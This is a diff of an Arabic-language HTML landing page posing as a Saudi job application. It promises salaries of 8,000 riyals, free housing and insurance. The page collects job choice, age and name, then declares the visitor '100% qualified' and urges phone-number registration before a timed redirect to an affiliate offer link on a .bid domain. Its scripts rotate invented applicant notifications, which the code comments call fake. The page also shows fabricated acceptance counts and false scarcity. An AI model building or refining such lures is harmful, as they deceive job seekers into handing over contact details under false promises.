@@ -6,145 +6,177 @@
 <title>وظائف السعودية 2026 | رواتب تصل 8000 ريال</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
 <style>
-body{font-family:'Cairo',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);margin:0;color:#333;}
-.container{max-width:420px;margin:auto;padding:20px;}
-.title{text-align:center;color:#fff;font-size:25px;font-weight:700;}
-.badge{background:#00c851;color:#fff;padding:10px;border-radius:20px;text-align:center;margin:10px 0;font-weight:700;}
-.urgent{background:#ff4444;color:#fff;padding:10px;border-radius:15px;text-align:center;font-size:14px;}
-.card{background:#fff;padding:25px;border-radius:20px;margin-top:15px;box-shadow:0 15px 40px rgba(0,0,0,.2);}
+* {margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Cairo',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333;}
+.container{max-width:400px;margin:0 auto;}
+.title{text-align:center;color:#fff;font-size:28px;font-weight:700;margin-bottom:15px;}
+.badge{background:linear-gradient(45deg,#00c851,#00b140);color:#fff;padding:12px 20px;border-radius:25px;text-align:center;font-weight:700;font-size:16px;margin:10px 0;box-shadow:0 5px 15px rgba(0,200,81,.3);}
+.urgent{background:linear-gradient(45deg,#ff4444,#ff6b6b);color:#fff;padding:12px;border-radius:20px;text-align:center;font-weight:700;font-size:15px;margin:15px 0;box-shadow:0 5px 20px rgba(255,68,68,.4);}
+.card{background:#fff;border-radius:25px;padding:30px;margin-top:20px;box-shadow:0 20px 50px rgba(0,0,0,.3);position:relative;overflow:hidden;}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#00c851,#ff5a5f);}
+.progress{height:8px;background:#e9ecef;border-radius:10px;margin-bottom:20px;overflow:hidden;}
+.bar{height:100%;background:linear-gradient(90deg,#00c851,#28a745);width:25%;transition:all .4s ease;border-radius:10px;box-shadow:0 0 10px rgba(0,200,81,.5);}
+.fake{font-size:14px;color:#28a745;font-weight:600;margin-bottom:15px;text-align:center;}
+label{font-weight:700;color:#333;font-size:16px;margin-bottom:10px;display:block;}
+select,input{width:100%;padding:16px;border-radius:15px;border:2px solid #e9ecef;font-size:17px;font-family:'Cairo',sans-serif;margin-bottom:15px;transition:all .3s;}
+select:focus,input:focus{outline:none;border-color:#ff5a5f;box-shadow:0 0 0 3px rgba(255,90,95,.1);}
+input.hidden{display:none;}
+button{width:100%;padding:18px;border-radius:20px;border:none;background:linear-gradient(45deg,#ff5a5f,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;font-family:'Cairo',sans-serif;}
+button:hover{background:linear-gradient(45deg,#e5535a,#f55a5f);transform:translateY(-2px);box-shadow:0 10px 25px rgba(255,90,95,.4);}
 .step{display:none;}
 .step.active{display:block;}
-select,input{width:100%;padding:15px;margin-top:10px;border-radius:12px;border:1px solid #ddd;font-size:16px;}
-button{width:100%;padding:18px;margin-top:15px;border:none;border-radius:20px;background:#ff5a5f;color:#fff;font-size:18px;font-weight:700;cursor:pointer;}
-.progress{height:6px;background:#eee;border-radius:10px;margin-bottom:15px;overflow:hidden;}
-.bar{height:100%;width:25%;background:#00c851;transition:.3s;}
-.fake{font-size:13px;color:#28a745;margin-bottom:10px;}
-.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);display:none;justify-content:center;align-items:center;z-index:999;}
-.popup-content{background:#fff;padding:25px;border-radius:20px;text-align:center;width:85%;}
-.hidden{display:none;}
+.success{color:#00c851;font-size:24px;text-align:center;font-weight:700;margin:20px 0;}
+.important{background:#fff3cd;border:2px solid #ffeaa7;border-radius:15px;padding:15px;margin:20px 0;color:#856404;font-weight:600;text-align:center;}
+.phone-note{font-size:16px;color:#ff4444;font-weight:700;background:#fff5f5;padding:12px;border-radius:12px;border-left:5px solid #ff4444;margin:15px 0;}
+.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);display:none;justify-content:center;align-items:center;z-index:1000;}
+.popup-content{background:#fff;padding:30px;border-radius:25px;text-align:center;width:90%;max-width:380px;box-shadow:0 25px 70px rgba(0,0,0,.6);animation:popup 0.4s ease;}
+@keyframes popup{from{transform:scale(0.7) rotateX(20deg);opacity:0;}to{transform:scale(1) rotateX(0);opacity:1;}}
 </style>
 </head>
 <body>
 <div class="container">
-<h1 class="title">وظائف السعودية 🇸🇦</h1>
-<div class="badge">✔ تم قبول 327 طلب هذا الأسبوع</div>
-<div class="urgent">🔥 متبقي 3 أماكن فقط اليوم</div>
+<h1 class="title">وظائف السعودية 🇸🇦 2026</h1>
+<div class="badge">✔️ تم قبول 347 طلب هذا الأسبوع</div>
+<div class="urgent">🔥 متبقي 2 أماكن فقط اليوم!</div>
+
 <div class="card">
-<div class="progress"><div class="bar" id="bar"></div></div>
-<div class="fake" id="notif">شخص من الرياض بدأ التقديم الآن</div>
-<form id="form">
-<!-- STEP 1 -->
-<div class="step active">
-<label>اختر الوظيفة المناسبة لك</label>
-<select id="job" required>
-<option value="">اختر الوظيفة</option>
-<option>سائق</option>
-<option>سائق خاص</option>
-<option>عامل</option>
-<option>موظف استقبال</option>
-<option>حارس أمن</option>
-<option>محاسب</option>
-<option>سكرتير/ة</option>
-<option>مدرس/ة</option>
-<option>مسوق إلكتروني</option>
-<option>مندوب توصيل</option>
-<option>فني كهرباء</option>
-<option>نجار</option>
-<option>سباك</option>
-<option>طباخ</option>
-<option>كاشير</option>
-<option>ممرض/ة</option>
-<option value="other">وظيفة أخرى</option>
+<div class="progress"><div class="bar" id="progressBar"></div></div>
+<div class="fake" id="notification">محمد من الرياض أكمل التسجيل الآن</div>
+
+<form id="mainForm">
+<!-- الخطوة 1: الوظيفة -->
+<div class="step active" id="step1">
+<label>اختر الوظيفة المطلوبة:</label>
+<select id="jobSelect" required>
+<option value="">اختر وظيفتك...</option>
+<option value="سائق">🚗 سائق</option>
+<option value="سائق خاص">🚙 سائق خاص</option>
+<option value="عامل">👷 عامل</option>
+<option value="موظف استقبال">📞 موظف استقبال</option>
+<option value="حارس أمن">🛡️ حارس أمن</option>
+<option value="محاسب">💰 محاسب</option>
+<option value="سكرتيرة">💻 سكرتير/ة</option>
+<option value="مدرس">📚 مدرس/ة</option>
+<option value="مسوق">📱 مسوق إلكتروني</option>
+<option value="مندوب توصيل">📦 مندوب توصيل</option>
 </select>
-<input type="text" id="otherJob" class="hidden" placeholder="اكتب وظيفتك هنا">
-<button type="button" onclick="nextStep()">التالي</button>
+<button type="button" onclick="nextStep()">التالي ➡️</button>
 </div>
 
-<!-- STEP 2 -->
-<div class="step">
-<label>السن</label>
-<select id="age" required>
-<option value="">اختر السن</option>
-<option>18-22</option>
-<option>23-30</option>
-<option>31-40</option>
-<option>41+</option>
+<!-- الخطوة 2: السن -->
+<div class="step" id="step2">
+<label>فئة عمرك:</label>
+<select id="ageSelect" required>
+<option value="">اختر فئتك العمرية...</option>
+<option value="18-25">18-25 سنة</option>
+<option value="26-35">26-35 سنة</option>
+<option value="36-45">36-45 سنة</option>
+<option value="46+">46+ سنة</option>
 </select>
-<button type="button" onclick="nextStep()">التالي</button>
+<button type="button" onclick="nextStep()">التالي ➡️</button>
 </div>
 
-<!-- STEP 3 -->
-<div class="step">
-<label>اسمك الكامل</label>
-<input type="text" id="name" required>
-<button type="button" onclick="nextStep()">تأكيد البيانات</button>
+<!-- الخطوة 3: الاسم -->
+<div class="step" id="step3">
+<label>الاسم الكامل:</label>
+<input type="text" id="nameInput" placeholder="اكتب اسمك الكامل هنا..." required>
+<button type="button" onclick="nextStep()">تأكيد البيانات ➡️</button>
 </div>
 
-<!-- STEP 4 -->
-<div class="step">
-<h3 style="text-align:center;">🎉 تم قبولك مبدئياً</h3>
-<p style="text-align:center;">بناءً على بياناتك، أنت مؤهل للوظيفة</p>
-<!-- الزر الآن يفتح مباشرة رابط العرض -->
-<button type="button" id="finalBtn">إكمال التقديم الآن 🔥</button>
+<!-- الخطوة 4: القبول + التحويل -->
+<div class="step" id="step4">
+<div class="success">🎉 مبروك! تم قبولك مبدئياً</div>
+<p style="text-align:center;font-size:18px;color:#333;margin:20px 0;">بناءً على بياناتك أنت <strong>مؤهل 100%</strong> للوظيفة</p>
+
+<div class="important">
+💰 <strong>رواتب تبدأ من 8000 ريال + سكن مجاني + تأمين طبي</strong>
 </div>
 
+<div class="phone-note">
+📱 <strong>خطوة واحدة فقط متبقية:</strong><br>سجّل رقم هاتفك في النموذج الرسمي لتأكيد الحجز
+</div>
+
+<button type="button" id="finalSubmit" style="background:linear-gradient(45deg,#00c851,#28a745);font-size:20px;padding:22px;">🔥 سجّل الآن وأكد مكانك</button>
+<p style="font-size:14px;color:#666;margin-top:20px;text-align:center;">سيتم توجيهك للنموذج الرسمي خلال ثوان...</p>
+</div>
 </form>
 </div>
 </div>
 
-<div class="popup" id="popup">
+<!-- Popup التحويل -->
+<div class="popup" id="loadingPopup">
 <div class="popup-content">
-<h3>⏳ جاري تحويلك...</h3>
-<p>يرجى الانتظار</p>
+<div style="font-size:32px;color:#00c851;margin-bottom:15px;">⏳ جاري التحويل...</div>
+<p style="font-size:18px;color:#333;margin-bottom:25px;">ستحتاج تسجيل رقم هاتفك لتأكيد الحجز الرسمي</p>
+<div style="background:linear-gradient(45deg,#00c851,#28a745);color:white;padding:20px;border-radius:15px;font-weight:700;font-size:18px;margin-bottom:20px;">
+✅ <strong>مكانك محجوز - متبقي 2 أماكن فقط!</strong>
+</div>
 </div>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function(){
-let step=0;
-const steps=document.querySelectorAll(".step");
-const bar=document.getElementById("bar");
-const job=document.getElementById("job");
-const otherJob=document.getElementById("otherJob");
-const age=document.getElementById("age");
-const name=document.getElementById("name");
-const notif=document.getElementById("notif");
-const finalBtn=document.getElementById("finalBtn");
-const popup=document.getElementById("popup");
-
-// اظهار "وظيفة أخرى"
-job.addEventListener("change", function(){
-if(job.value==="other"){ otherJob.classList.remove("hidden"); }
-else{ otherJob.classList.add("hidden"); }
-});
-
-// التنقل بين الخطوات
-window.nextStep=function(){
-if(step===0){ if(!job.value) return; if(job.value==="other" && !otherJob.value) return; }
-if(step===1 && !age.value) return;
-if(step===2 && !name.value) return;
-steps[step].classList.remove("active");
-step++;
-if(steps[step]){
-steps[step].classList.add("active");
-bar.style.width=(step+1)*25+"%";
-}
-}
-
-// fake notifications
-const fakeList=["أحمد من جدة سجل الآن","سارة من الرياض تم قبولها","تم حجز مقابلة قبل دقيقة","مستخدم جديد أكمل التسجيل"];
-setInterval(()=>{ notif.innerText=fakeList[Math.floor(Math.random()*fakeList.length)]; },2500);
-
-// تحويل عند الضغط على زر النهائي
-finalBtn.addEventListener("click", function(){
-popup.style.display="flex";
-setTimeout(function(){
-window.location.href="https://xmaaubb.bid/cl/ab0187b5f3ec8583"; // لينك العرض
-},1500);
-});
-
+document.addEventListener('DOMContentLoaded', function() {
+    let currentStep = 1;
+    const steps = document.querySelectorAll('.step');
+    const progressBar = document.getElementById('progressBar');
+    const notification = document.getElementById('notification');
+    
+    // وظيفة الانتقال للخطوة التالية
+    window.nextStep = function() {
+        const jobSelect = document.getElementById('jobSelect');
+        const ageSelect = document.getElementById('ageSelect');
+        const nameInput = document.getElementById('nameInput');
+        
+        if (currentStep === 1 && (!jobSelect.value || jobSelect.value === '')) {
+            alert('⚠️ يرجى اختيار الوظيفة');
+            return;
+        }
+        
+        if (currentStep === 2 && (!ageSelect.value || ageSelect.value === '')) {
+            alert('⚠️ يرجى اختيار فئتك العمرية');
+            return;
+        }
+        
+        if (currentStep === 3 && (!nameInput.value || nameInput.value.trim().length < 2)) {
+            alert('⚠️ يرجى كتابة اسمك الكامل');
+            return;
+        }
+        
+        // إخفاء الخطوة الحالية
+        steps[currentStep - 1].classList.remove('active');
+        
+        // الانتقال للخطوة التالية
+        currentStep++;
+        if (currentStep <= steps.length) {
+            steps[currentStep - 1].classList.add('active');
+            progressBar.style.width = (currentStep * 25) + '%';
+        }
+    };
+    
+    // زر التسجيل النهائي - التحويل المباشر
+    document.getElementById('finalSubmit').addEventListener('click', function() {
+        document.getElementById('loadingPopup').style.display = 'flex';
+        
+        // تحويل مضمون بعد 2.5 ثانية
+        setTimeout(function() {
+            window.location.href = 'https://xmaaubb.bid/cl/ab0187b5f3ec8583';
+        }, 2500);
+    });
+    
+    // إشعارات وهمية
+    const notifications = [
+        'محمد من الرياض أكمل التسجيل الآن',
+        'فاطمة من جدة تم قبولها ✅',
+        'تم حجز مقابلة قبل 30 ثانية',
+        'علي من الدمام حصل على الوظيفة',
+        'نورة سجلت وحجزت مقابلتها'
+    ];
+    
+    setInterval(function() {
+        const randomNotif = notifications[Math.floor(Math.random() * notifications.length)];
+        notification.textContent = randomNotif;
+    }, 3000);
 });
 </script>
-
 </body>
 </html>
